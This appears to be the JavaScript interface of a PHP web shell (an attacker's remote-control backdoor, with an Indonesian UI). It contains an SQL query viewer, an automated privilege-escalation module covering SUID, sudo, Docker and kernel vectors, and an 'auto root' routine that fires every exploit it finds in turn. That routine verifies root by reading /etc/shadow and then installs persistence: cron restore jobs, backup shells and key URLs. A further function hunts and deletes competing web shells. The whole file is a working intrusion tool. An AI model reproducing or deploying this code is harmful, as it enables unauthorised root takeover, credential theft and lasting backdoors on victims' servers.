                    if (data.affected_rows !== undefined) {
                        html += `<span style="color: #888;">Rows affected: ${data.affected_rows}</span>`;
                    }
                    html += `</div>`;
                } else if (data.data) {
                    html += `<span style="color: #0f0;">✅ ${data.num_rows} rows returned</span>`;
                    html += `</div>`;
                    if (data.columns && data.columns.length > 0) {
                        html += '<div style="overflow-x: auto; border: 1px solid #0f0; border-radius: 4px;">';
                        html += '<table style="width: 100%; border-collapse: collapse; font-size: 12px;">';
                        html += '<thead><tr>';
                        data.columns.forEach(col => {
                            html += `<th>${escapeHtml(col)}</th>`;
                        });
                        html += '</tr></thead><tbody>';
                        data.data.forEach((row) => {
                            html += `<tr>`;
                            data.columns.forEach(col => {
                                const val = row[col] !== null ? row[col] : '<span style="color: #666;">NULL</span>';
                                html += `<td title="${escapeHtml(String(val)).replace(/"/g, '&quot;')}">${escapeHtml(String(val))}</td>`;
                            });
                            html += '</tr>';
                        });
                        html += '</tbody></table></div>';
                    }
                }
            } else {
                html += `<span style="color: #f44;">❌ Error</span></div>`;
                html += `<div style="background: #300; padding: 15px; border-radius: 4px; color: #f88;">`;
                html += `<strong>Error:</strong><br>${escapeHtml(data.error)}`;
                html += `</div>`;
            }
            resultDiv.innerHTML = html;
        })
        .catch(error => {
            resultDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + error.message + '</p>';
        });
}
function clearSqlResult() {
    document.getElementById('sqlResult').innerHTML = '<p style="color: #666;">Execute a query to see results...</p>';
}

// 🔥 Auto Privilege Escalation Functions
let privescScanResults = null;

// Utility: Add log entry (now goes to output)
function addPrivescLog(message, type = 'info') {
    const outputDiv = document.getElementById('privescOutput');
    if (!outputDiv) return;
    outputDiv.style.display = 'block';
    const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const color = type === 'success' ? '#0f0' : type === 'error' ? '#f44' : type === 'warn' ? '#ff0' : '#6cf';
    outputDiv.innerHTML += '<span style="color:#666">[' + time + ']</span> <span style="color:' + color + '">' + message + '</span>\n';
    outputDiv.scrollTop = outputDiv.scrollHeight;
}

// Utility: Clear log
function clearPrivescLog() {
    const outputDiv = document.getElementById('privescOutput');
    if (outputDiv) {
        outputDiv.innerHTML = '';
        outputDiv.style.display = 'none';
    }
}

// Utility: Update progress bar
function updatePrivescProgress(current, total) {
    const percent = Math.round((current / total) * 100);
    const statusDiv = document.getElementById('privescStatus');
    if (statusDiv) {
        statusDiv.innerHTML = '<div class="privesc-progress"><div>⏳ Scanning... ' + current + '/' + total + ' (' + percent + '%)</div><div class="privesc-progress-bar"><div class="privesc-progress-fill" style="width:' + percent + '%"></div></div></div>';
    }
}

// Quick scan with compact output
async function scanPrivesc() {
    const resultsDiv = document.getElementById('privescResults');
    const statusDiv = document.getElementById('privescStatus');
    const outputDiv = document.getElementById('privescOutput');
    const vectors = ['kernel', 'suid', 'sudo', 'docker'];
    const vectorEmojis = { kernel: '🐛', suid: '⚡', sudo: '🔑', docker: '🐳' };
    
    // Reset UI
    resultsDiv.style.display = 'none';
    resultsDiv.innerHTML = '';
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '⏳ Scanning...';
    outputDiv.innerHTML = '<div style="color:#6cf">🔍 Starting scan...</div>';
    
    const results = {};
    let foundCount = 0;
    
    // Scan key vectors only (faster)
    for (const vector of vectors) {
        try {
            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
            const data = await response.json();
            
            if (data.success) {
                results[vector] = data.data;
                
                if (vector === 'kernel' && data.data.vulnerable) {
                    outputDiv.innerHTML += '<span style="color:#f44">🐛 ' + data.data.exploits.length + ' kernel CVEs</span>\n';
                    foundCount++;
                } else if (vector === 'suid' && data.data.exploitable.length > 0) {
                    outputDiv.innerHTML += '<span style="color:#ff0">⚡ ' + data.data.exploitable.length + ' SUID bins</span>\n';
                    foundCount++;
                    document.getElementById('statSuid').textContent = data.data.exploitable.length;
                } else if (vector === 'sudo' && data.data.exploitable.length > 0) {
                    outputDiv.innerHTML += '<span style="color:#0f0">🔑 ' + data.data.exploitable.length + ' sudo</span>\n';
                    foundCount++;
                    document.getElementById('statSudo').textContent = 'Yes';
                } else if (vector === 'docker' && data.data.escape_possible) {
                    outputDiv.innerHTML += '<span style="color:#6cf">🐳 Docker escape</span>\n';
                    foundCount++;
                    document.getElementById('statDocker').textContent = 'Yes';
                }
            }
        } catch (error) {
            // Silent fail
        }
    }
    
    statusDiv.innerHTML = foundCount > 0 ? '✅ Found ' + foundCount + ' vectors' : '⚠️ No easy vectors';
    statusDiv.style.borderColor = foundCount > 0 ? '#0f0' : '#f44';
    privescScanResults = results;
    displayPrivescResults(results);
    updatePrivescStats(results);
    
    const vulnCount = countVulnerabilities(results);
    if (vulnCount > 0) {
        addPrivescLog('Scan complete! Found ' + vulnCount + ' potential vectors.', 'success');
        statusDiv.className = 'privesc-status success';
        statusDiv.innerHTML = '✅ Scan completed! Found ' + vulnCount + ' potential vectors.';
    } else {
        addPrivescLog('Scan complete. No obvious vectors found.', 'warn');
        statusDiv.className = 'privesc-status';
        statusDiv.innerHTML = '✅ Scan completed. No obvious vectors found.';
    }
}

function displayPrivescResults(results) {
    const resultsDiv = document.getElementById('privescResults');
    let html = '<div style="display:flex;flex-direction:column;gap:6px;">';
    let hasResults = false;
    
    // SUID Binaries - Compact
    if (results.suid && results.suid.exploitable.length > 0) {
        hasResults = true;
        html += '<div style="border:1px solid #f44;background:#2a0000;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#f44;margin-bottom:3px;">⚡ SUID (' + results.suid.exploitable.length + ')</div>';
        results.suid.exploitable.slice(0, 3).forEach(bin => {
            html += '<div style="font-size:10px;margin:2px 0;display:flex;justify-content:space-between;align-items:center;">';
            html += '<code style="background:#000;padding:2px 4px;border-radius:3px;font-size:10px;">' + bin.binary + '</code>';
            html += '<button onclick="runPrivescExploit(\'suid\', \'' + escapeHtml(bin.payload) + '\')" style="background:#f44;color:#fff;border:none;padding:2px 6px;border-radius:3px;font-size:9px;cursor:pointer;">Run</button>';
            html += '</div>';
        });
        html += '</div>';
    }
    
    // Sudo Permissions - Compact
    if (results.sudo && results.sudo.exploitable.length > 0) {
        hasResults = true;
        html += '<div style="border:1px solid #0f0;background:#001a00;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#0f0;margin-bottom:3px;">🔑 SUDO (' + results.sudo.exploitable.length + ')</div>';
        results.sudo.exploitable.slice(0, 2).forEach(sudo => {
            html += '<div style="font-size:10px;margin:2px 0;">';
            html += '<code style="background:#000;padding:2px 4px;border-radius:3px;font-size:10px;">' + escapeHtml(sudo.payload.substring(0, 35)) + '...</code>';
            html += '</div>';
        });
        html += '</div>';
    }
    
    // Docker - Compact
    if (results.docker && results.docker.escape_possible) {
        hasResults = true;
        html += '<div style="border:1px solid #6cf;background:#001a2a;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#6cf;">🐳 Docker Escape</div>';
        html += '</div>';
    }
    
    // Kernel - Compact
    if (results.kernel && results.kernel.vulnerable) {
        hasResults = true;
        html += '<div style="border:1px solid #ff0;background:#2a2a00;padding:6px;border-radius:4px;">';
        html += '<div style="font-weight:bold;font-size:11px;color:#ff0;">🐛 Kernel: ' + results.kernel.exploits.length + ' CVEs</div>';
        html += '</div>';
    }
    
    html += '</div>';
    
    if (hasResults) {
        resultsDiv.innerHTML = html;
        resultsDiv.style.display = 'block';
    } else {
        resultsDiv.style.display = 'none';
        resultsDiv.innerHTML = '';
    }
}

function updatePrivescStats(results) {
    if (results.kernel) {
        document.getElementById('statKernel').textContent = results.kernel.kernel;
    }
    if (results.suid) {
        document.getElementById('statSuid').textContent = results.suid.count;
    }
    if (results.sudo) {
        document.getElementById('statSudo').textContent = results.sudo.accessible ? 'Yes' : 'No';
    }
    if (results.docker) {
        document.getElementById('statDocker').textContent = results.docker.in_docker ? 'Yes (Container)' : 'No';
    }
}

function countVulnerabilities(results) {
    let count = 0;
    if (results.kernel && results.kernel.vulnerable) count += results.kernel.exploits.length;
    if (results.suid) count += results.suid.exploitable.length;
    if (results.sudo) count += results.sudo.exploitable.length;
    if (results.docker && results.docker.escape_possible) count += results.docker.methods.length;
    return count;
}

function runPrivescExploit(method, target) {
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '⏳ Executing ' + method + ' exploit...';
    
    const formData = new FormData();
    formData.append('action', 'privesc_exploit');
    formData.append('method', method);
    formData.append('target', target);
    
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                outputDiv.innerHTML = '<span style="color:#0f0;">✅ Exploit executed!</span>\n\n' + escapeHtml(data.output);
                statusDiv.className = 'privesc-status success';
                statusDiv.innerHTML = '✅ Exploit completed! Check output below.';
            } else {
                outputDiv.innerHTML = '<span style="color:#f44;">❌ Exploit failed!</span>\n\n' + escapeHtml(data.output);
                statusDiv.className = 'privesc-status error';
                statusDiv.innerHTML = '❌ Exploit failed!';
            }
        })
        .catch(error => {
            outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + escapeHtml(error.message) + '</span>';
        });
}

// 🔥 BRUTAL AUTO ROOT - Try ALL exploits, parallel scan, chain attacks
async function autoGetRoot() {
    const btn = document.getElementById('getRootBtn');
    const statusDiv = document.getElementById('privescStatus');
    const outputDiv = document.getElementById('privescOutput');
    const vectors = ['kernel', 'suid', 'sudo', 'capabilities', 'docker', 'writable', 'cron', 'services'];
    const vectorNames = {
        kernel: '🐛 Kernel', suid: '⚡ SUID', sudo: '🔑 SUDO',
        capabilities: '🛡️ Caps', docker: '🐳 Docker',
        writable: '📝 Writable', cron: '⏰ Cron', services: '⚙️ Services'
    };
    
    // Reset UI
    btn.disabled = true;
    btn.innerHTML = '🔥 BRUTAL PRIVESC ACTIVE...';
    statusDiv.style.display = 'block';
    statusDiv.className = 'privesc-status';
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '';
    clearPrivescLog();
    
    // Helper to add to output
    const log = (msg, type = 'info') => {
        const color = type === 'success' ? '#0f0' : type === 'error' ? '#f44' : type === 'warn' ? '#ff0' : '#6cf';
        outputDiv.innerHTML += '<span style="color:' + color + '">' + msg + '</span>\n';
        outputDiv.scrollTop = outputDiv.scrollHeight;
    };
    
    log('[*] 🔥🔥🔥 BRUTAL AUTO ROOT v2.0 🔥🔥🔥');
    log('[*] Mode: PARALLEL SCAN + CHAIN ATTACK + MULTI-EXPLOIT');
    log('[*] Target: ' + window.location.hostname);
    log('[*] =========================================\n');
    
    statusDiv.innerHTML = '⏳ Phase 1/4: PARALLEL SCANNING ALL VECTORS...';
    addPrivescLog('🚀 PARALLEL SCAN STARTED', 'info');
    
    // Phase 1: PARALLEL SCAN - Scan all vectors simultaneously
    const scanPromises = vectors.map(async (vector) => {
        try {
            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
            const data = await response.json();
            return { vector, data, success: data.success };
        } catch (err) {
            return { vector, error: err.message, success: false };
        }
    });
    
    const scanResults = await Promise.all(scanPromises);
    const results = {};
    const allExploits = []; // Collect ALL exploits from ALL vectors
    
    scanResults.forEach(({ vector, data, success, error }) => {
        if (success && data) {
            results[vector] = data.data;
            
            // Collect ALL exploits, not just first one
            if (vector === 'suid' && data.data.exploitable?.length > 0) {
                data.data.exploitable.forEach((exp, idx) => {
                    allExploits.push({
                        type: 'suid', 
                        priority: 1, // High priority
                        data: exp,
                        name: exp.binary
                    });
                });
                log('[+] ⚡ SUID: ' + data.data.exploitable.length + ' binaries!', 'success');
            }
            else if (vector === 'sudo' && data.data.exploitable?.length > 0) {
                data.data.exploitable.forEach((exp, idx) => {
                    allExploits.push({
                        type: 'sudo', 
                        priority: 0, // Highest priority
                        data: exp,
                        name: exp.method
                    });
                });
                log('[+] 🔑 SUDO: ' + data.data.exploitable.length + ' misconfigs!', 'success');
            }
            else if (vector === 'docker' && data.data.escape_possible) {
                data.data.methods.forEach((method, idx) => {
                    allExploits.push({
                        type: 'docker', 
                        priority: 2,
                        data: method,
                        name: method.method
                    });
                });
                log('[+] 🐳 DOCKER: ' + data.data.methods.length + ' escape methods!', 'success');
            }
            else if (vector === 'kernel' && data.data.vulnerable) {
                data.data.exploits.forEach((exp, idx) => {
                    allExploits.push({
                        type: 'kernel', 
                        priority: 3, // Lower (need compilation)
                        data: exp,
                        name: exp.cve
                    });
                });
                log('[+] 🐛 KERNEL: ' + data.data.exploits.length + ' CVEs!', 'success');
            }
            else if (vector === 'capabilities' && data.data.interesting?.length > 0) {
                allExploits.push({
                    type: 'capabilities',
                    priority: 4,
                    data: { caps: data.data.interesting },
                    name: 'Capabilities'
                });
                log('[+] 🛡️ CAPS: ' + data.data.interesting.length + ' caps', 'success');
            }
            else {
                log('[✓] ' + vectorNames[vector] + ': Safe');
            }
        } else if (error) {
            log('[!] ' + vectorNames[vector] + ' error: ' + error, 'error');
        }
    });
    
    privescScanResults = results;
    displayPrivescResults(results);
    updatePrivescStats(results);
    
    // Sort by priority (lower = higher priority)
    allExploits.sort((a, b) => a.priority - b.priority);
    
    log('\n[*] =========================================');
    log('[*] SCAN COMPLETE: ' + allExploits.length + ' total exploits collected');
    log('[*] =========================================\n');
    
    if (allExploits.length === 0) {
        log('[!] ❌ NO EXPLOITS FOUND - SYSTEM IS HARDENED', 'error');
        btn.disabled = false;
        btn.innerHTML = '🔥 GET ROOT (AUTO) - RETRY';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ No exploits found.';
        return;
    }
    
    // Phase 2: BRUTAL EXPLOITATION - Try ALL exploits until root
    statusDiv.innerHTML = '⏳ Phase 2/4: BRUTAL EXPLOITATION (' + allExploits.length + ' exploits)...';
    log('[*] =========================================');
    log('[*] Phase 2/4: BRUTAL EXPLOITATION');
    log('[*] Trying ALL exploits until root obtained...');
    log('[*] =========================================\n');
    
    let rootObtained = false;
    let attempts = 0;
    const maxAttempts = allExploits.length;
    
    for (const exploit of allExploits) {
        attempts++;
        
        // Skip kernel exploits (need manual compilation)
        if (exploit.type === 'kernel') {
            log('[*] [' + attempts + '/' + maxAttempts + '] Skipping ' + exploit.name + ' (needs manual compile)', 'warn');
            continue;
        }
        
        // Skip capabilities (manual execution)
        if (exploit.type === 'capabilities') {
            log('[*] [' + attempts + '/' + maxAttempts + '] Skipping capabilities (manual)', 'warn');
            continue;
        }
        
        statusDiv.innerHTML = '⏳ Trying exploit ' + attempts + '/' + maxAttempts + ': ' + exploit.type.toUpperCase() + ' - ' + exploit.name;
        log('[*] [' + attempts + '/' + maxAttempts + '] Trying ' + exploit.type.toUpperCase() + ': ' + exploit.name);
        
        try {
            const formData = new FormData();
            formData.append('action', 'privesc_exploit');
            formData.append('method', exploit.type);
            formData.append('target', exploit.data.payload || exploit.data);
            
            const execResponse = await fetch('', { method: 'POST', body: formData });
            const execData = await execResponse.json();
            
            if (execData.success) {
                log('[+] Exploit executed: ' + exploit.name, 'success');
                
                // IMMEDIATELY verify if root obtained
                const isRoot = await verifyRootAccess();
                
                if (isRoot) {
                    rootObtained = true;
                    log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
                    log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
                    break; // STOP - we got root!
                } else {
                    log('[!] Exploit ran but no root yet, continuing...', 'warn');
                }
            } else {
                log('[-] Failed: ' + (execData.output?.substring(0, 100) || 'No output'), 'error');
            }
        } catch (err) {
            log('[!] Error: ' + err.message, 'error');
        }
        
        // Small delay between attempts
        await new Promise(r => setTimeout(r, 500));
    }
    
    // Phase 3: CHAIN ATTACK - If single exploits failed, try combinations
    if (!rootObtained && allExploits.length >= 2) {
        log('\n[*] =========================================');
        log('[*] Phase 3/4: CHAIN ATTEMPT');
        log('[*] Trying exploit combinations...');
        log('[*] =========================================\n');
        
        statusDiv.innerHTML = '⏳ Phase 3/4: CHAIN ATTACK...';
        
        // Try SUID + Sudo chain
        const suidExp = allExploits.find(e => e.type === 'suid');
        const sudoExp = allExploits.find(e => e.type === 'sudo');
        
        if (suidExp && sudoExp) {
            log('[*] Trying SUID→SUDO chain...');
            // First SUID
            await tryExploit(suidExp);
            await new Promise(r => setTimeout(r, 1000));
            // Then SUDO
            await tryExploit(sudoExp);
            
            const isRoot = await verifyRootAccess();
            if (isRoot) {
                rootObtained = true;
                log('[+] 🎉 ROOT via CHAIN ATTACK!', 'success');
            }
        }
    }
    
    // Phase 4: Verification & Persistence
    if (rootObtained) {
        statusDiv.innerHTML = '✅ Phase 4/4: ROOT CONFIRMED - Installing persistence...';
        log('\n[*] =========================================');
        log('[*] Phase 4/4: VERIFICATION & PERSISTENCE');
        log('[*] =========================================\n');
        
        // Comprehensive verification
        await performFullVerification(log);
        
        btn.innerHTML = '✅ ROOT OBTAINED';
        btn.style.background = 'linear-gradient(135deg, #0f0, #0a0)';
        statusDiv.className = 'privesc-status success';
        statusDiv.innerHTML = '🎉 ROOT OBTAINED! Installing persistence...';
        
        // Install persistence
        await installPersistenceWithLog();
        
        log('\n[*] =========================================');
        log('[*] ✅ BRUTAL AUTO-ROOT COMPLETE!', 'success');
        log('[*] Total attempts: ' + attempts);
        log('[*] =========================================');
        addPrivescLog('✅ BRUTAL ROOT COMPLETE!', 'success');
    } else {
        log('[!] ❌ ALL EXPLOITS FAILED', 'error');
        log('[*] Try manual exploitation with kernel exploits or custom payloads.\n');
        btn.disabled = false;
        btn.innerHTML = '🔥 GET ROOT (AUTO) - RETRY';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ All exploits failed. Try manual.';
    }
}

// Helper: Try single exploit
async function tryExploit(exploit) {
    try {
        const formData = new FormData();
        formData.append('action', 'privesc_exploit');
        formData.append('method', exploit.type);
        formData.append('target', exploit.data.payload || exploit.data);
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        return data.success;
    } catch (e) {
        return false;
    }
}

// Helper: Quick root verification
async function verifyRootAccess() {
    try {
        const verifyForm = new FormData();
        verifyForm.append('cmd', 'id && whoami');
        verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
        
        const response = await fetch('', { method: 'POST', body: verifyForm });
        const html = await response.text();
        
        // Multiple checks for root
        const rootIndicators = [
            'uid=0(root)',
            'gid=0(root)',
            'whoami\nroot',
            'whoami:root',
            '>root<',
            'euid=0'
        ];
        
        return rootIndicators.some(indicator => html.includes(indicator));
    } catch (e) {
        return false;
    }
}

// Helper: Full verification
async function performFullVerification(log) {
    const checks = [
        { cmd: 'id', expect: 'uid=0(root)' },
        { cmd: 'whoami', expect: 'root' },
        { cmd: 'cat /etc/shadow 2>/dev/null | head -1', expect: ':' },
        { cmd: 'ps aux | grep root | head -3', expect: 'root' }
    ];
    
    for (const check of checks) {
        try {
            const formData = new FormData();
            formData.append('cmd', check.cmd);
            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: formData });
            const html = await response.text();
            
            const passed = html.includes(check.expect);
            log((passed ? '[+] ✅ ' : '[-] ❌ ') + check.cmd + ': ' + (passed ? 'PASS' : 'FAIL'),
                passed ? 'success' : 'error');
        } catch (e) {
            log('[-] ❌ ' + check.cmd + ': ERROR', 'error');
        }
    }
}

// Async version with logging for autoGetRoot
async function installPersistenceWithLog() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">[PERSIST] Installing persistence mechanisms...</span>\n';
    addPrivescLog('Installing persistence...', 'info');
    
    try {
        const formData = new FormData();
        formData.append('action', 'install_persistence');
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            outputDiv.innerHTML += '\n<span style="color:#0f0;">✅ PERSISTENCE INSTALLED!</span>\n';
            outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ SIMPAN INFORMASI INI!</span>\n\n';
            addPrivescLog('Persistence installed!', 'success');
            
            for (const [method, info] of Object.entries(data.methods)) {
                const isInstalled = info.status === 'installed' || info.status === 'ready';
                const icon = isInstalled ? '✅' : '❌';
                
                outputDiv.innerHTML += '<span style="color:' + (isInstalled ? '#0f0' : '#f44') + '">' + icon + ' ' + method.toUpperCase() + '</span>\n';
                
                if (info.description) {
                    outputDiv.innerHTML += '   📋 ' + info.description + '\n';
                }
                
                // Access URLs
                if (info.access_urls && info.access_urls.length > 0) {
                    outputDiv.innerHTML += '   🔗 Access URLs:\n';
                    info.access_urls.forEach(url => {
                        outputDiv.innerHTML += '      → <a href="' + url + '" target="_blank" style="color:#0f0;">' + url + '</a>\n';
                    });
                }
                
                if (info.access_url) {
                    outputDiv.innerHTML += '   🔗 URL: <a href="' + info.access_url + '" target="_blank" style="color:#0f0;">' + info.access_url + '</a>\n';
                }
                
                // Private key URL
                if (info.private_key_url) {
                    outputDiv.innerHTML += '   🔑 Private key: <a href="' + info.private_key_url + '" target="_blank" style="color:#0f0;">' + info.private_key_url + '</a>\n';
                }
                
                if (info.how_to_use) {
                    outputDiv.innerHTML += '   💡 ' + info.how_to_use + '\n';
                }
                
                if (info.note) {
                    outputDiv.innerHTML += '   📝 Note: ' + info.note + '\n';
                }
                
                if (info.method) {
                    outputDiv.innerHTML += '   ⚙️ Method: ' + info.method + '\n';
                }
                
                outputDiv.innerHTML += '\n';
            }
            
            outputDiv.innerHTML += '\n<span style="color:#f44;">⚠️ ' + (data.warning || 'Simpan semua URL dan key!') + '</span>\n';
            
            // REKAP URLS
            if (data.all_urls && data.all_urls.length > 0) {
                outputDiv.innerHTML += '\n<span style="color:#0f0;">📋 SEMUA URL SHELL:</span>\n';
                data.all_urls.forEach((url, i) => {
                    outputDiv.innerHTML += '   ' + (i+1) + '. ' + url + '\n';
                });
            }
            
            // DOKUMENTASI
            if (data.documentation_file) {
                outputDiv.innerHTML += '\n<span style="color:#6cf;">📖 Dokumentasi: ' + data.documentation_file + '</span>\n';
            }
            
            outputDiv.scrollTop = outputDiv.scrollHeight;
            return true;
        } else {
            outputDiv.innerHTML += '<span style="color:#f44;">❌ Persistence installation failed</span>\n';
            addPrivescLog('Persistence failed', 'error');
            return false;
        }
    } catch (err) {
        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
        addPrivescLog('Persistence error: ' + err.message, 'error');
        return false;
    }
}

// Shell Scanner Functions
async function scanOtherShells() {
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<div style="text-align:center;padding:30px;"><p style="font-size:30px;animation:pulse 1s infinite;">🕵️</p><p style="color:#0f0;">Scanning for other web shells...</p><p style="color:#888;font-size:11px;">This may take 30-60 seconds depending on directory size</p></div>';
    statusDiv.style.display = 'block';
    statusDiv.className = 'privesc-status';
    statusDiv.innerHTML = '⏳ Scanning PHP files for suspicious patterns...';
    
    try {
        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_shells');
        const data = await response.json();
        
        if (data.success) {
            displayShellScanResults(data);
            statusDiv.className = 'privesc-status success';
            statusDiv.innerHTML = '✅ Scan complete! Scanned ' + data.scanned + ' files, found ' + data.found + ' potential shells.';
        } else {
            outputDiv.innerHTML = '<span style="color:#f44;">❌ Scan failed: ' + (data.error || 'Unknown error') + '</span>';
            statusDiv.className = 'privesc-status error';
            statusDiv.innerHTML = '❌ Scan failed';
        }
    } catch (err) {
        outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + err.message + '</span>';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ Error: ' + err.message;
    }
}

function displayShellScanResults(data) {
    const outputDiv = document.getElementById('privescOutput');
    
    let html = '<div style="background:#1a1a1a;border:1px solid #f44;padding:15px;margin-bottom:15px;">';
    html += '<h3 style="color:#f44;margin:0 0 10px 0;">🕵️ SHELL SCAN RESULTS</h3>';
    html += '<p style="color:#888;margin:0;font-size:12px;">Scanned: ' + data.scanned + ' PHP files | Found: ' + data.found + ' potential shells</p>';
    if (data.recursive && data.max_depth !== undefined) {
        html += '<p style="color:#666;margin:5px 0 0 0;font-size:11px;">🔍 Recursive scan (max depth: ' + data.max_depth + ' levels)</p>';
    }
    html += '</div>';
    
    if (data.shells.length === 0) {
        html += '<div style="background:#001a00;border:1px solid #0f0;padding:15px;">';
        html += '<p style="color:#0f0;margin:0;">✅ No suspicious shells detected!</p>';
        html += '</div>';
    } else {
        data.shells.forEach((shell, index) => {
            const confidenceColor = shell.confidence >= 80 ? '#f44' : shell.confidence >= 50 ? '#ff0' : '#f80';
            const confidenceText = shell.confidence >= 80 ? 'HIGH' : shell.confidence >= 50 ? 'MEDIUM' : 'LOW';
            
            html += '<div style="border:1px solid ' + confidenceColor + ';margin:10px 0;padding:12px;background:#1a1a1a;border-radius:4px;">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
            html += '<h4 style="color:' + confidenceColor + ';margin:0;font-size:13px;">' + (index + 1) + '. ' + shell.filename + '</h4>';
            html += '<span style="background:' + confidenceColor + ';color:#000;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold;">' + confidenceText + ' (' + shell.confidence + '%)</span>';
            html += '</div>';
            
            html += '<p style="color:#6cf;margin:5px 0;font-size:11px;word-break:break-all;">📁 ' + shell.path + '</p>';
            if (shell.relative_path && shell.depth !== undefined) {
                html += '<p style="color:#666;margin:5px 0;font-size:10px;">📂 Relative: ' + shell.relative_path + ' (Depth: ' + shell.depth + ')</p>';
            }
            html += '<p style="color:#888;margin:5px 0;font-size:11px;">📊 Size: ' + formatBytes(shell.size) + ' | 📅 Modified: ' + shell.modified + '</p>';
            
            html += '<p style="color:#ff0;margin:5px 0;font-size:11px;">⚠️ Reasons:</p>';
            html += '<ul style="margin:5px 0;color:#888;font-size:11px;">';
            shell.reasons.forEach(reason => {
                html += '<li>' + reason + '</li>';
            });
            html += '</ul>';
            
            html += '<div style="margin-top:10px;display:flex;gap:10px;">';
            html += '<button onclick="jumpToShellLocation(\'' + encodeURIComponent(shell.dir) + '\')" style="background:#0f0;color:#000;padding:5px 15px;border:none;cursor:pointer;font-size:11px;font-weight:bold;">📂 Jump to Location</button>';
            html += '<button onclick="deleteShellFile(\'' + encodeURIComponent(shell.path) + '\', \'' + encodeURIComponent(shell.filename) + '\')" style="background:#f44;color:#fff;padding:5px 15px;border:none;cursor:pointer;font-size:11px;font-weight:bold;">🗑️ Delete File</button>';
            html += '</div>';
            
            html += '</div>';
        });
    }
    
    outputDiv.innerHTML = html;
}

function jumpToShellLocation(dir) {
    const decodedDir = decodeURIComponent(dir);
    navigateToDir(decodedDir);
    closeModal('privescModal');
}

async function deleteShellFile(path, filename) {
    const decodedPath = decodeURIComponent(path);
    const decodedFilename = decodeURIComponent(filename);
    
    if (!confirm('⚠️ WARNING: Are you sure you want to delete "' + decodedFilename + '"?\n\nThis action cannot be undone!')) {
        return;
    }
    
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    statusDiv.innerHTML = '⏳ Deleting ' + decodedFilename + '...';
    
    try {
        const formData = new FormData();
        formData.append('action', 'delete_shell');
        formData.append('target', decodedPath);
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            statusDiv.className = 'privesc-status success';
            statusDiv.innerHTML = '✅ ' + decodedFilename + ' deleted successfully!';
            // Refresh scan results
            setTimeout(() => scanOtherShells(), 1000);
        } else {
            statusDiv.className = 'privesc-status error';
            statusDiv.innerHTML = '❌ Failed to delete: ' + (data.error || 'Unknown error');
        }
    } catch (err) {
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ Error: ' + err.message;
    }
}

function installPersistence() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">⏳ Installing persistence mechanisms...</span>';
    
    const formData = new FormData();
    formData.append('action', 'install_persistence');
    
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = '<div style="background:#001a00;border:1px solid #0f0;padding:15px;margin-bottom:15px;">';
                html += '<h3 style="color:#0f0;margin:0 0 10px 0;">✅ PERSISTENCE BERHASIL DIINSTALL!</h3>';
                html += '<p style="color:#ff0;margin:0;font-size:12px;">⚠️ SIMPAN SEMUA INFORMASI INI SEBELUM MENUTUP BROWSER!</p>';
                html += '</div>';
                
                // Penjelasan perbedaan backup types
                html += '<div style="background:#1a1a1a;border:1px solid #6cf;padding:10px;margin-bottom:15px;">';
                html += '<p style="color:#6cf;margin:0;font-size:11px;"><strong>📚 PERBEDAAN BACKUP:</strong></p>';
                html += '<p style="color:#ccc;margin:5px 0 0 0;font-size:11px;">';
                html += '<span style="color:#0f0;">🟢 CRON (System Backups):</span> Di /tmp/, /var/tmp/ - untuk auto-restore jika shell dihapus<br>';
                html += '<span style="color:#ff0;">🟡 BACKUP (Web Backups):</span> Di folder shell - untuk akses browser cepat';
                html += '</p></div>';
                
                for (const [method, info] of Object.entries(data.methods)) {
                    const isInstalled = info.status === 'installed' || info.status === 'ready';
                    const borderColor = isInstalled ? '#0f0' : '#f44';
                    const icon = isInstalled ? '✅' : '❌';
                    
                    html += '<div style="border:1px solid ' + borderColor + ';margin:10px 0;padding:12px;background:#1a1a1a;border-radius:4px;">';
